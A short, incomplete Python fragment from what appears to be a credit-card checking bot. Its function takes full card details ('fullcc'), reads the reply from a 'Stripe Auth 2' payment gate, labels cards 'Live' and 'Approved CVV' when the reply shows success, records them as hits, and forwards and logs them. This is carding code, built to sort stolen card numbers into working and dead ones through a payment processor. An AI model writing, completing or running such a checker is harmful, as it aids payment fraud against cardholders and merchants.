...
async def get_auth_resp(result, user_id, fullcc):
    try:
        ...
        if type(result) == str:
        ...
        elif 'true' in result.text or "succeeded" in result.text:
            status   = "Live 🟢"
            response = "Approved CVV ✅"
            hits     = "YES"
            await forward_resp(fullcc, "Stripe Auth 2", response)
            ...
            try:
                ...
                await result_logs(fullcc, "Stripe Auth 2", result)
            hits = "NO"
